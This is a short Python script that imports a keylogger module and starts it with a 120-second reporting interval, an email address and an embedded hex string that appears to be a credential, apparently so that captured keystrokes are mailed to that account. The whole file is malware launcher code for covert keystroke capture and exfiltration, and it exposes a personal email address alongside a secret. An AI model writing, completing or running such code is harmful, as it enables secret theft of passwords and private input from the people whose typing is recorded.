#!/usr/bin/env python

import keylogger

try:
    logger = keylogger.Keylogger(120,"pauloclmatos@gmail.com", "C4B77E61D94856CDE0147B27C100ACFAC09FE20D8D882043EE5E9554855D8342")
    logger.start()
except KeyboardInterrupt:
    print()